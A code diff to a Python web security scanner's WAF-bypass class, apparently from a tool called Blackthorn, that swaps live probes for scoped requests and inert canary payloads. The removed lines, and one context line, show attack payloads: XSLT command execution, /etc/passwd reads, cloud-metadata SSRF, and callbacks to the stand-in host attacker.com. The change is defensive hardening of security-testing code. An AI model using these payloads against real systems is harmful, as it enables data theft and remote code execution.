-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     self.target,
                     timeout=self.timeout + 5,
                     headers={'Range': range_header}
                 )
                 elapsed = time.time() - start_time
                 
-                if resp:
+                if resp is not None:
                     # Check for unusual response
                     if resp.status_code == 206:  # Partial Content
                         if 'Many ranges' in technique and elapsed > 2:
@@ -8084,15 +9306,15 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for body, content_type, technique in multipart_attacks:
             try:
-                resp = self._session.post(
-                    self.target,
+                resp = self._scoped_safe_request(
+                    self.target, method='POST',
                     data=body.encode(),
                     headers={'Content-Type': content_type},
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp:
+                if resp is not None:
                     # Check if XSS payload was reflected (WAF bypassed)
                     if xss_payload in resp.text:
                         result = {
@@ -8124,72 +9346,16 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_dns_rebinding(self) -> List[Dict[str, Any]]:
-        """DNS rebinding attack detection"""
-        results = []
-        print("  [*] Testing DNS rebinding susceptibility...")
-        
-        # DNS rebinding test domains (these resolve to different IPs over time)
-        rebind_domains = [
-            f'rebind.127.0.0.1.xip.io',
-            f'rebind.169.254.169.254.nip.io',
-            f'127.0.0.1.xip.io',
-            f'169.254.169.254.nip.io',
-            f'localtest.me',  # Always resolves to 127.0.0.1
-            f'lvh.me',  # Always resolves to 127.0.0.1
-        ]
-        
-        # Check if target validates Host header properly
-        for rebind_domain in rebind_domains:
-            try:
-                resp = safe_request(
-                    self.target,
-                    timeout=self.timeout,
-                    headers={'Host': rebind_domain}
-                )
-                
-                if resp and resp.status_code == 200:
-                    # Check if different content returned
-                    if len(resp.content) != self._baseline_size:
-                        result = {
-                            'technique': f'DNS Rebinding: {rebind_domain}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': f'Server accepts rebinding domain {rebind_domain}',
-                            'severity': 'MEDIUM',
-                            'category': 'DNS_REBINDING'
-                        }
-                        results.append(result)
-                        print(f"  [!] DNS Rebinding susceptible with {rebind_domain}")
-                        
-            except Exception as e:
-                logger.debug(f"DNS rebinding error: {e}")
-        
-        # Test SSRF with rebinding domains
-        ssrf_params = ['url', 'redirect', 'link', 'src']
-        for rebind_domain in rebind_domains[:2]:
-            for param in ssrf_params[:2]:
-                try:
-                    resp = safe_request(
-                        f"{self.target}/?{param}=http://{rebind_domain}/",
-                        timeout=self.timeout
-                    )
-                    
-                    if resp and 'localhost' in resp.text.lower() or '127.0.0.1' in resp.text:
-                        result = {
-                            'technique': f'SSRF DNS Rebind: {rebind_domain}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'SSRF protection bypassed via DNS rebinding',
-                            'severity': 'HIGH',
-                            'category': 'DNS_REBINDING'
-                        }
-                        results.append(result)
-                        print(f"  [✓] SSRF DNS Rebinding successful")
-                        
-                except Exception as e:
-                    logger.debug(f"SSRF rebinding error: {e}")
-        
-        return results
+        """Disabled until Blackthorn can control and observe DNS answer changes.
+
+        A Host-header response delta is not DNS rebinding proof. Faithful testing
+        requires a user-owned authoritative domain that changes answers between
+        the browser's validation and use phases, plus correlated callback/state
+        evidence. The catalog keeps this method visible, but the accuracy guard
+        prevents it from running.
+        """
+        logger.info("DNS rebinding scanner requires a proof-capable rebinding service")
+        return []
     
     def _test_timing_based_discovery(self) -> List[Dict[str, Any]]:
         """Timing-based blind resource discovery"""
@@ -8201,7 +9367,7 @@ class CloudFrontBypasser(ExtraTechniques):
         for _ in range(3):
             try:
                 start = time.time()
-                resp = safe_request(f"{self.target}/nonexistent_{int(time.time())}", timeout=self.timeout)
+                resp = self._scoped_safe_request(f"{self.target}/nonexistent_{int(time.time())}", timeout=self.timeout)
                 baseline_times.append(time.time() - start)
             except:
                 baseline_times.append(1.0)
@@ -8223,7 +9389,7 @@ class CloudFrontBypasser(ExtraTechniques):
                 times = []
                 for _ in range(2):
                     start = time.time()
-                    resp = safe_request(f"{self.target}{resource}", timeout=self.timeout)
+                    resp = self._scoped_safe_request(f"{self.target}{resource}", timeout=self.timeout)
                     times.append(time.time() - start)
                 
                 avg_time = sum(times) / len(times)
@@ -8234,7 +9400,7 @@ class CloudFrontBypasser(ExtraTechniques):
                         'resource': resource,
                         'avg_time': avg_time,
                         'baseline': baseline_avg,
-                        'status': resp.status_code if resp else 0
+                        'status': resp.status_code if resp is not None else 0
                     })
                     
             except Exception as e:
@@ -8314,12 +9480,12 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for payload, technique in error_triggers:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}{payload}",
                     timeout=self.timeout
                 )
                 
-                if resp:
+                if resp is not None:
                     content_lower = resp.text.lower()
                     
                     found_indicators = [ind for ind in error_indicators if ind in content_lower]
@@ -8409,19 +9575,20 @@ class CloudFrontBypasser(ExtraTechniques):
                 path = technique_template.replace('TARGETPATH', sensitive_path.lstrip('/'))
                 
                 try:
-                    resp = safe_request(
+                    resp = self._scoped_safe_request(
                         f"{self.target}{path}",
                         timeout=self.timeout,
                         allow_redirects=False
                     )
                     
-                    if resp:
+                    if resp is not None:
                         # Check if we got different response than 404
                         if resp.status_code in [200, 301, 302, 403]:
                             # Compare with baseline for this path
-                            baseline_resp = safe_request(f"{self.target}{sensitive_path}", timeout=self.timeout)
+                            baseline_resp = self._scoped_safe_request(f"{self.target}{sensitive_path}", timeout=self.timeout)
                             
-                            if baseline_resp and baseline_resp.status_code != resp.status_code:
+                            if (baseline_resp is not None
+                                    and baseline_resp.status_code != resp.status_code):
                                 result = {
                                     'technique': f'Path Norm: {technique_name}',
                                     'bypass': True,
@@ -8440,27 +9607,29 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_content_sniffing(self) -> List[Dict[str, Any]]:
-        """Content type sniffing attacks with polyglot files"""
+        """Discover upload/content-type confusion surfaces with inert polyglots."""
         results = []
         print("  [*] Testing content sniffing attacks...")
+        marker = f'BT-SNIFF-{random.randrange(10**8, 10**9)}'
+        harmless_html = f'<p>{marker}</p>'.encode()
         
         # Polyglot payloads (files that are valid in multiple formats)
         polyglots = [
             # GIFAR (GIF + ZIP/JAR)
-            (b'GIF89a/*<script>alert(1)</script>*/', 'image/gif', 'GIFAR'),
+            (b'GIF89a/*' + harmless_html + b'*/', 'image/gif', 'GIF/HTML'),
             
             # PDF + HTML
-            (b'%PDF-1.4<script>alert(1)</script>', 'application/pdf', 'PDF+HTML'),
+            (b'%PDF-1.4' + harmless_html, 'application/pdf', 'PDF/HTML'),
             
             # PNG + HTML
-            (b'\x89PNG\r\n\x1a\n<script>alert(1)</script>', 'image/png', 'PNG+HTML'),
+            (b'\x89PNG\r\n\x1a\n' + harmless_html, 'image/png', 'PNG/HTML'),
             
             # JPEG + HTML
-            (b'\xff\xd8\xff\xe0<script>alert(1)</script>', 'image/jpeg', 'JPEG+HTML'),
+            (b'\xff\xd8\xff\xe0' + harmless_html, 'image/jpeg', 'JPEG/HTML'),
             
             # SVG (XML)
-            (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 
-             'image/svg+xml', 'SVG+XSS'),
+            (b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg">'
+             b'<text>BLACKTHORN-INERT</text></svg>', 'image/svg+xml', 'SVG'),
         ]
         
         # Test upload endpoints
@@ -8470,35 +9639,50 @@ class CloudFrontBypasser(ExtraTechniques):
             for content, mime_type, technique in polyglots[:3]:
                 try:
                     # Upload the polyglot
-                    files = {'file': ('test.gif', content, mime_type)}
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
+                    filename = f'blackthorn-{marker.lower()}.bin'
+                    files = {'file': (filename, content, mime_type)}
+                    resp = self._scoped_safe_request(
+                        f"{self.target}{endpoint}", method='POST',
                         files=files,
                         timeout=self.timeout,
                         verify=False
                     )
                     
-                    if resp and resp.status_code in [200, 201]:
+                    if resp is not None and resp.status_code in [200, 201]:
                         # Check if file URL is returned
                         if 'url' in resp.text.lower() or 'path' in resp.text.lower():
                             result = {
-                                'technique': f'Content Sniff: {technique}',
+                                'technique': f'Content-type upload candidate: {technique}',
                                 'bypass': True,
                                 'status': resp.status_code,
-                                'reason': f'Polyglot {technique} uploaded at {endpoint}',
-                                'severity': 'MEDIUM',
-                                'category': 'CONTENT_SNIFFING'
+                                'reason': (f'Inert mixed-format file was accepted at {endpoint}; '
+                                           'browser sniffing and script execution were not proven'),
+                                'severity': 'LOW',
+                                'category': 'CONTENT_SNIFFING',
+                                'kind': 'suspected',
+                                'verification_status': 'candidate',
+                                'confidence': 'low',
+                                'method': 'POST', 'path': endpoint,
+                                'url': f'{self.target}{endpoint}',
+                                'payload': filename,
+                                'evidence': [{
+                                    'type': 'mixed_format_upload_acceptance',
+                                    'description': ('Application returned a URL/path response '
+                                                    'after inert polyglot upload'),
+                                    'matched': technique,
+                                }],
+                                '_no_reconfirm': True,
                             }
                             results.append(result)
-                            print(f"  [!] Content sniff: {technique} at {endpoint}")
+                            print(f"  [!] Content-type upload candidate: {technique} at {endpoint}")
                             
                 except Exception as e:
                     logger.debug(f"Content sniffing error: {e}")
         
         # Check for X-Content-Type-Options header
         try:
-            resp = safe_request(self.target, timeout=self.timeout)
-            if resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
+            if resp is not None:
                 xcto = resp.headers.get('X-Content-Type-Options', '')
                 if xcto.lower() != 'nosniff':
                     result = {
@@ -8507,7 +9691,9 @@ class CloudFrontBypasser(ExtraTechniques):
                         'status': resp.status_code,
                         'reason': 'Content sniffing protection not enabled',
                         'severity': 'LOW',
-                        'category': 'CONTENT_SNIFFING'
+                        'category': 'CONTENT_SNIFFING',
+                        'kind': 'observation',
+                        'verification_status': 'informational',
                     }
                     results.append(result)
         except:
@@ -8525,12 +9711,12 @@ class CloudFrontBypasser(ExtraTechniques):
         for length in url_lengths:
             try:
                 long_param = 'A' * length
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     f"{self.target}/?test={long_param}",
                     timeout=self.timeout + 5
                 )
                 
-                if resp:
+                if resp is not None:
                     if resp.status_code in [200, 400, 414]:
                         if resp.status_code == 200:
                             result = {
@@ -8552,13 +9738,13 @@ class CloudFrontBypasser(ExtraTechniques):
         header_sizes = [4000, 8000, 16000]
         for size in header_sizes:
             try:
-                resp = safe_request(
+                resp = self._scoped_safe_request(
                     self.target,
                     timeout=self.timeout,
                     headers={'X-Large-Header': 'A' * size}
                 )
                 
-                if resp and resp.status_code == 200:
+                if resp is not None and resp.status_code == 200:
                     result = {
                         'technique': f'Large Header Accepted: {size} chars',
                         'bypass': False,
@@ -8577,13 +9763,13 @@ class CloudFrontBypasser(ExtraTechniques):
         # Many headers test
         try:
             many_headers = {f'X-Header-{i}': f'value-{i}' for i in range(100)}
-            resp = safe_request(
+            resp = self._scoped_safe_request(
                 self.target,
                 timeout=self.timeout,
                 headers=many_headers
             )
             
-            if resp and resp.status_code == 200:
+            if resp is not None and resp.status_code == 200:
                 result = {
                     'technique': 'Many Headers Accepted: 100 headers',
                     'bypass': False,
@@ -8601,15 +9787,15 @@ class CloudFrontBypasser(ExtraTechniques):
         body_sizes = [1024*100, 1024*1000, 1024*10000]  # 100KB, 1MB, 10MB
         for size in body_sizes:
             try:
-                resp = self._session.post(
-                    self.target,
+                resp = self._scoped_safe_request(
+                    self.target, method='POST',
                     data='A' * size,
                     timeout=self.timeout + 10,
                     verify=False,
                     headers={'Content-Type': 'application/octet-stream'}
                 )
                 
-                if resp and resp.status_code in [200, 201]:
+                if resp is not None and resp.status_code in [200, 201]:
                     size_kb = size // 1024
                     result = {
                         'technique': f'Large Body Accepted: {size_kb}KB',
@@ -8698,15 +9884,15 @@ class CloudFrontBypasser(ExtraTechniques):
         
         for payload in desync_payloads:
             try:
-                resp = self._session.post(
-                    self.target,
+                resp = self._scoped_safe_request(
+                    self.target, method='POST',
                     headers=payload['headers'],
                     data=payload['body'],
                     timeout=self.timeout,
                     verify=False
                 )
                 
-                if resp and resp.status_code in [200, 400]:
+                if resp is not None and resp.status_code in [200, 400]:
                     # Analyze response for desync indicators
                     if resp.status_code == 200 and len(resp.content) != self._baseline_size:
                         result = {
@@ -8752,26 +9938,31 @@ class CloudFrontBypasser(ExtraTechniques):
             # Comment
             '<!--',
         ]
+        dangling_payloads = [p.replace('attacker.com', 'blackthorn.invalid')
+                             for p in dangling_payloads]
         
         for payload in dangling_payloads:
             try:
                 encoded = quote(payload)
-                resp = safe_request(
-                    f"{self.target}/?test={encoded}",
-                    timeout=self.timeout
+                result = self._test_request(
+                    path=f'/?test={encoded}',
+                    technique=f'Dangling markup candidate: {payload[:30]}...',
+                    probe={
+                        'category': 'DANGLING_MARKUP', 'payload': payload,
+                        'parameter': 'test',
+                        'insertion_point': {'type': 'query', 'name': 'test'},
+                        'detector_id': 'dangling-markup-reflection-v2',
+                        'oracle': {
+                            'type': 'reflection', 'value': payload,
+                            'severity': 'LOW',
+                            'reason': ('Unclosed markup was reflected verbatim; HTML '
+                                       'context and data exfiltration are unverified'),
+                        },
+                    },
                 )
-                
-                if resp and payload in resp.text:
-                    result = {
-                        'technique': f'Dangling Markup: {payload[:30]}...',
-                        'bypass': True,
-                        'status': resp.status_code,
-                        'reason': 'Unclosed HTML tag reflected - data exfiltration possible',
-                        'severity': 'MEDIUM',
-                        'category': 'DANGLING_MARKUP'
-                    }
+                if self._result_has_evidence(result, 'unencoded_reflection'):
                     results.append(result)
-                    print(f"  [!] Dangling markup reflected")
+                    print("  [!] Dangling markup reflection candidate")
                     
             except Exception as e:
                 logger.debug(f"Dangling markup error: {e}")
@@ -8795,6 +9986,7 @@ class CloudFrontBypasser(ExtraTechniques):
             # CSS variable injection
             '--x:url(http://attacker.com/log);',
         ]
+        css_payloads = [p.replace('attacker.com', 'blackthorn.invalid') for p in css_payloads]
         
         injection_points = [
             ('style=', 'Inline style'),
@@ -8808,22 +10000,25 @@ class CloudFrontBypasser(ExtraTechniques):
                     full_payload = f"{injection}{payload}"
                     encoded = quote(full_payload)
                     
-                    resp = safe_request(
-                        f"{self.target}/?test={encoded}",
-                        timeout=self.timeout
+                    result = self._test_request(
+                        path=f'/?test={encoded}',
+                        technique=f'CSS injection candidate: {technique}',
+                        probe={
+                            'category': 'CSS_INJECTION', 'payload': full_payload,
+                            'parameter': 'test',
+                            'insertion_point': {'type': 'query', 'name': 'test'},
+                            'detector_id': 'css-reflection-v2',
+                            'oracle': {
+                                'type': 'reflection', 'value': payload,
+                                'severity': 'LOW',
+                                'reason': ('CSS text was reflected verbatim; a valid '
+                                           'style context or browser effect is unverified'),
+                            },
+                        },
                     )
-                    
-                    if resp and payload in resp.text:
-                        result = {
-                            'technique': f'CSS Injection: {technique}',
-                            'bypass': True,
-                            'status': resp.status_code,
-                            'reason': 'CSS injection reflected - data exfiltration possible',
-                            'severity': 'MEDIUM',
-                            'category': 'CSS_INJECTION'
-                        }
+                    if self._result_has_evidence(result, 'unencoded_reflection'):
                         results.append(result)
-                        print(f"  [!] CSS injection via {technique}")
+                        print(f"  [!] CSS reflection candidate via {technique}")
                         break
                         
                 except Exception as e:
@@ -8836,23 +10031,17 @@ class CloudFrontBypasser(ExtraTechniques):
         results = []
         print("  [*] Testing XSLT injection...")
         
-        xslt_payloads = [
-            # Document function (SSRF/file read)
-            '<xsl:value-of select="document(\'http://attacker.com/\')"/>',
-            '<xsl:value-of select="document(\'file:///etc/passwd\')"/>',
-            
-            # System property disclosure
-            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>',
-            
-            # PHP function (if PHP XSL extension)
-            '<xsl:value-of select="php:function(\'system\', \'id\')"/>',
-            
-            # Java extension
-            '<xsl:value-of xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" select="rt:exec(rt:getRuntime(),\'id\')"/>',
-            
-            # Include/import
-            '<xsl:include href="http://attacker.com/evil.xsl"/>',
-        ]
+        # Complete, non-networked stylesheet. The rendered vendor canary is not
+        # contiguous in the request, so plain reflection cannot satisfy it.
+        xslt_payloads = [(
+            '<?xml version="1.0"?>'
+            '<xsl:stylesheet version="1.0" '
+            'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
+            '<xsl:output method="text"/>'
+            '<xsl:template match="/">BTXSLT-'
+            '<xsl:value-of select="system-property(\'xsl:vendor\')"/>'
+            '-END</xsl:template></xsl:stylesheet>'
+        )]
         
         # Test endpoints that might process XSLT
         xslt_endpoints = [
@@ -8863,31 +10052,36 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         for endpoint in xslt_endpoints[:2]:
-            for payload in xslt_payloads[:3]:
+            for payload in xslt_payloads:
                 try:
-                    # Test via POST
-                    resp = self._session.post(
-                        endpoint,
-                        data=payload,
+                    endpoint_path = urlparse(endpoint).path or '/'
+                    result = self._test_request(
+                        method='POST', path=endpoint_path, data=payload,
                         headers={'Content-Type': 'application/xml'},
-                        timeout=self.timeout,
-                        verify=False
+                        technique='XSLT stylesheet injection',
+                        probe={
+                            'category': 'XSLT_INJECTION', 'payload': payload,
+                            'insertion_point': {'type': 'body', 'name': 'stylesheet'},
+                            'detector_id': 'xslt-rendered-vendor-v2',
+                            'control': {
+                                'method': 'POST', 'path': endpoint_path,
+                                'headers': {'Content-Type': 'application/xml'},
+                                'data': ('<?xml version="1.0"?><xsl:stylesheet version="1.0" '
+                                         'xmlns:xsl="http://www.w3.org/1999/XSL/Transform">'
+                                         '<xsl:template match="/">BLACKTHORN-CONTROL'
+                                         '</xsl:template></xsl:stylesheet>'),
+                            },
+                            'oracle': {
+                                'type': 'regex',
+                                'patterns': [r'BTXSLT-[A-Za-z][A-Za-z0-9 ._/-]{1,120}-END'],
+                                'severity': 'HIGH',
+                                'reason': 'Server rendered the supplied XSLT system-property expression',
+                            },
+                        },
                     )
-                    
-                    if resp:
-                        # Check for XSLT execution indicators
-                        indicators = ['Saxon', 'Xalan', 'libxslt', 'root:', 'uid=', 'attacker.com']
-                        if any(ind in resp.text for ind in indicators):
-                            result = {
-                                'technique': 'XSLT Injection',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': 'XSLT payload executed',
-                                'severity': 'CRITICAL',
-                                'category': 'XSLT_INJECTION'
-                            }
-                            results.append(result)
-                            print(f"  [✓] CRITICAL: XSLT Injection")
+                    if self._result_has_evidence(result, 'response_signature'):
+                        results.append(result)
+                        print("  [✓] HIGH: XSLT stylesheet injection")
                             
                 except Exception as e:
                     logger.debug(f"XSLT injection error: {e}")
@@ -8895,28 +10089,16 @@ class CloudFrontBypasser(ExtraTechniques):
         return results
     
     def _test_pdf_injection(self) -> List[Dict[str, Any]]:
-        """PDF generation injection testing"""
+        """Locate HTML-to-PDF surfaces with inert markup.
+
+        Network/file payloads need OOB or returned-file proof and belong in a
+        separately authorized workflow. A PDF response by itself is discovery,
+        not SSRF, local-file inclusion, or script execution.
+        """
         results = []
-        print("  [*] Testing PDF generation injection...")
-        
-        # Payloads for PDF generators (wkhtmltopdf, PhantomJS, etc.)
-        pdf_payloads = [
-            # SSRF via PDF
-            '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>',
-            '<img src="http://169.254.169.254/latest/meta-data/">',
-            '<link rel="stylesheet" href="http://169.254.169.254/">',
-            
-            # Local file read
-            '<iframe src="file:///etc/passwd"></iframe>',
-            '<embed src="file:///etc/passwd">',
-            '<object data="file:///etc/passwd">',
-            
-            # JavaScript execution
-            '<script>x=new XMLHttpRequest();x.open("GET","http://attacker.com/",false);x.send();</script>',
-            
-            # Annotation injection
-            '<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File">',
-        ]
+        print("  [*] Discovering PDF generation surfaces with inert markup...")
+        marker = f'BT-PDF-{random.randrange(10**8, 10**9)}'
+        payload = f'<p>{marker}</p>'
         
         # PDF generation endpoints
         pdf_endpoints = [
@@ -8925,94 +10107,108 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         for endpoint in pdf_endpoints[:3]:
-            for payload in pdf_payloads[:3]:
-                try:
-                    resp = self._session.post(
-                        f"{self.target}{endpoint}",
-                        data={'content': payload, 'html': payload, 'body': payload},
-                        timeout=self.timeout + 5,
-                        verify=False
-                    )
-                    
-                    if resp and resp.status_code == 200:
-                        # Check if response is PDF
-                        if resp.content[:4] == b'%PDF' or 'application/pdf' in resp.headers.get('Content-Type', ''):
-                            result = {
-                                'technique': f'PDF Injection: {endpoint}',
-                                'bypass': True,
-                                'status': resp.status_code,
-                                'reason': 'PDF generation endpoint found - test for SSRF/LFI',
-                                'severity': 'MEDIUM',
-                                'category': 'PDF_INJECTION'
-                            }
-                            results.append(result)
-                            print(f"  [!] PDF generation at {endpoint}")
-                            break
-                            
-                except Exception as e:
-                    logger.debug(f"PDF injection error: {e}")
+            try:
+                resp = self._scoped_safe_request(
+                    f"{self.target}{endpoint}", method='POST',
+                    data={'content': payload, 'html': payload, 'body': payload},
+                    timeout=self.timeout + 5, verify=False
+                )
+
+                if (resp is not None and resp.status_code == 200 and
+                        (resp.content[:4] == b'%PDF' or
+                         'application/pdf' in resp.headers.get('Content-Type', ''))):
+                    result = {
+                        'technique': f'PDF generation surface: {endpoint}',
+                        'bypass': False, 'status': resp.status_code,
+                        'reason': ('Endpoint generated a PDF from inert markup; '
+                                   'SSRF/LFI/script execution was not tested'),
+                        'severity': 'INFO', 'category': 'PDF_INJECTION',
+                        'kind': 'observation',
+                        'verification_status': 'informational',
+                        'confidence': 'high', 'method': 'POST',
+                        'path': endpoint, 'url': f'{self.target}{endpoint}',
+                        'payload': payload,
+                        'request': {
+                            'method': 'POST', 'url': f'{self.target}{endpoint}',
+                            'path': endpoint, 'headers': {},
+                            'body': {'content': payload, 'html': payload,
+                                     'body': payload},
+                        },
+                        'response': {
+                            'status': resp.status_code,
+                            'content_type': resp.headers.get('Content-Type', ''),
+                            'size': len(resp.content),
+                        },
+                        'evidence': [{
+                            'type': 'pdf_generation_surface',
+                            'description': 'Response had PDF magic bytes or media type',
+                            'matched': resp.headers.get('Content-Type', '%PDF'),
+                        }],
+                        '_no_reconfirm': True,
+                    }
+                    results.append(result)
+                    print(f"  [i] PDF generation surface at {endpoint}")
+            except Exception as e:
+                logger.debug(f"PDF generation probe error: {e}")
         
         return results
     
     def _test_postmessage_vulnerabilities(self) -> List[Dict[str, Any]]:
-        """PostMessage vulnerability detection"""
+        """Statically identify message listeners that need manual validation."""
         results = []
         print("  [*] Testing PostMessage vulnerabilities...")
         
         try:
-            resp = safe_request(self.target, timeout=self.timeout, allow_redirects=True)
-            if not resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout, allow_redirects=True)
+            if resp is None:
                 return results
             
             content = resp.text.lower()
             
-            # Check for postMessage usage
-            postmessage_patterns = [
-                'postmessage',
-                'addeventlistener.*message',
-                'onmessage',
-                'window.parent.postmessage',
-                'parent.postmessage',
-                'opener.postmessage',
-            ]
-            
-            # Check for insecure origin validation
-            insecure_patterns = [
-                'event.origin',  # Good if followed by comparison
-                "event.origin === '*'",  # Bad
-                'event.origin == null',  # Bad
-                "indexof('http')",  # Weak validation
-                ".includes('.",  # Weak validation
-            ]
-            
-            found_postmessage = any(p in content for p in postmessage_patterns)
-            
-            if found_postmessage:
-                # Check for insecure patterns
-                has_insecure = any(p in content for p in insecure_patterns[1:])
-                no_origin_check = 'event.origin' not in content
-                
-                if has_insecure or no_origin_check:
-                    result = {
-                        'technique': 'PostMessage Vulnerability',
-                        'bypass': True,
-                        'status': resp.status_code,
-                        'reason': 'postMessage used without proper origin validation',
-                        'severity': 'MEDIUM',
-                        'category': 'POSTMESSAGE'
-                    }
-                    results.append(result)
-                    print(f"  [!] PostMessage vulnerability detected")
-                else:
-                    result = {
-                        'technique': 'PostMessage Usage',
-                        'bypass': False,
-                        'status': resp.status_code,
-                        'reason': 'postMessage found - manual review recommended',
-                        'severity': 'INFO',
-                        'category': 'POSTMESSAGE'
-                    }
-                    results.append(result)
+            listener = re.search(
+                r'''(?is)(addEventListener\s*\(\s*["']message["']|\bonmessage\s*=)''',
+                content,
+            )
+            sender = re.search(r'(?is)\bpostMessage\s*\(', content)
+            if not listener and not sender:
+                return results
+
+            has_origin_reference = bool(re.search(r'\b(?:event|e)\.origin\b', content))
+            weak_origin_check = bool(re.search(
+                r'''(?is)\.origin\s*(?:==|===)\s*["']\*["']|'''
+                r'''\.origin[^;\n]{0,100}(?:indexOf|includes)\s*\(''',
+                content,
+            ))
+            candidate = bool(listener and (weak_origin_check or not has_origin_reference))
+            reason = (
+                'Static message listener has no clear exact origin check; runtime data-flow '
+                'and impact still need browser verification'
+                if candidate else
+                'postMessage use detected; static source alone does not establish an exploitable listener'
+            )
+            matched = (listener or sender).group(0)[:160]
+            result = {
+                'technique': ('PostMessage listener review' if listener
+                              else 'PostMessage sender observed'),
+                'bypass': candidate, 'status': resp.status_code,
+                'reason': reason, 'severity': 'LOW' if candidate else 'INFO',
+                'category': 'POSTMESSAGE',
+                'kind': 'suspected' if candidate else 'observation',
+                'verification_status': 'candidate' if candidate else 'informational',
+                'confidence': 'low' if candidate else 'high',
+                'method': 'GET', 'path': '/', 'url': self.target,
+                'request': {'method': 'GET', 'path': '/', 'url': self.target,
+                            'headers': {}, 'body': None},
+                'response': {'status': resp.status_code,
+                             'content_type': resp.headers.get('Content-Type', '')},
+                'evidence': [{
+                    'type': 'static_message_listener' if listener else 'postmessage_usage',
+                    'description': reason, 'matched': matched,
+                }],
+                '_no_reconfirm': True,
+            }
+            results.append(result)
+            print(f"  [{'!' if candidate else 'i'}] {reason}")
                     
         except Exception as e:
             logger.debug(f"PostMessage test error: {e}")
@@ -9035,37 +10231,64 @@ class CloudFrontBypasser(ExtraTechniques):
         
         try:
             # Get baseline to check for relative paths
-            resp = safe_request(self.target, timeout=self.timeout)
-            if resp:
+            resp = self._scoped_safe_request(self.target, timeout=self.timeout)
+            if resp is not None:
                 # Check for relative CSS/JS paths (vulnerable to RPO)
                 relative_patterns = [
                     r'href=["\'](?!https?://|//)[^"\']+\.css',
                     r'src=["\'](?!https?://|//)[^"\']+\.js',
                 ]
                 
-                has_relative = any(re.search(p, resp.text) for p in relative_patterns)
+                relative_match = next(
+                    (match for pattern in relative_patterns
+                     if (match := re.search(pattern, resp.text))),
+                    None,
+                )
                 
-                if has_relative:
+                if relative_match:
                     for rpo_path in rpo_paths:
                         try:
-                            rpo_resp = safe_request(
+                            rpo_resp = self._scoped_safe_request(
                                 f"{self.target}{rpo_path}",
                                 timeout=self.timeout,
                                 allow_redirects=False
                             )
                             
-                            if rpo_resp and rpo_resp.status_code == 200:
+                            if rpo_resp is not None and rpo_resp.status_code == 200:
                                 # Check if path traversal affected CSS/JS loading
                                 result = {
-                                    'technique': f'RPO: {rpo_path[:30]}',
+                                    'technique': f'RPO routing candidate: {rpo_path[:30]}',
                                     'bypass': True,
                                     'status': rpo_resp.status_code,
-                                    'reason': 'Relative paths + path manipulation = potential XSS via CSS',
-                                    'severity': 'MEDIUM',
-                                    'category': 'RPO_ATTACK'
+                                    'reason': ('A manipulated route returned HTML that uses a '
+                                               'relative asset; stylesheet interpretation and '
+                                               'attacker-controlled CSS were not proven'),
+                                    'severity': 'LOW',
+                                    'category': 'RPO_ATTACK',
+                                    'kind': 'suspected',
+                                    'verification_status': 'candidate',
+                                    'confidence': 'low',
+                                    'method': 'GET', 'path': rpo_path,
+                                    'url': f'{self.target}{rpo_path}',
+                                    'request': {
+                                        'method': 'GET', 'path': rpo_path,
+                                        'url': f'{self.target}{rpo_path}',
+                                        'headers': {}, 'body': None,
+                                    },
+                                    'response': {
+                                        'status': rpo_resp.status_code,
+                                        'content_type': rpo_resp.headers.get('Content-Type', ''),
+                                    },
+                                    'evidence': [{
+                                        'type': 'relative_asset_on_manipulated_route',
+                                        'description': ('Relative JS/CSS reference remained on '
+                                                        'a path-manipulated HTML response'),
+                                        'matched': relative_match.group(0)[:180],
+                                    }],
+                                    '_no_reconfirm': True,
                                 }
                                 results.append(result)
-                                print(f"  [!] RPO vulnerability potential")
+                                print("  [!] RPO routing candidate; browser proof required")
                                 break
                                 
                         except:
@@ -9077,7 +10300,9 @@ class CloudFrontBypasser(ExtraTechniques):
                         'status': resp.status_code,
                         'reason': 'No relative paths found - RPO unlikely',
                         'severity': 'INFO',
-                        'category': 'RPO_ATTACK'
+                        'category': 'RPO_ATTACK',
+                        'kind': 'observation',
+                        'verification_status': 'informational',
                     }
                     results.append(result)
                     
@@ -9119,12 +10344,12 @@ class CloudFrontBypasser(ExtraTechniques):
         for param in int_params[:5]:
             for value, technique in overflow_values[:6]:
                 try:
-                    resp = safe_request(
+                    resp = self._scoped_safe_request(
                         f"{self.target}/?{param}={value}",
                         timeout=self.timeout
                     )
                     
-                    if resp:
+                    if resp is not None:
                         # Check for error indicators
                         error_indicators = [
                             'overflow', 'out of range', 'too large', 'too small',
@@ -9169,11 +10394,8 @@ class CloudFrontBypasser(ExtraTechniques):
         ]
         
         # Extract base domain
-        domain_parts = self.domain.split('.')
-        if len(domain_parts) >= 2:
-            base_domain = '.'.join(domain_parts[-2:])
-        else:
-            base_domain = self.domain
+        target_hostname = urlparse(self.target).hostname or self.domain
+        base_domain = target_hostname
         
         found_subdomains = []
         
@@ -9185,9 +10407,9 @@ class CloudFrontBypasser(ExtraTechniques):
                 
                 # Try to connect
                 test_url = f"https://{subdomain}"
-                resp = safe_request(test_url, timeout=3, allow_redirects=True)
+                resp = self._scoped_safe_request(test_url, timeout=3, allow_redirects=True)
                 
-                if resp:
+                if resp is not None:
                     return {
                         'subdomain': subdomain,
                         'ip': ip,
@@ -9210,22 +10432,19 @@ class CloudFrontBypasser(ExtraTechniques):
                     found_subdomains.append(result)
         
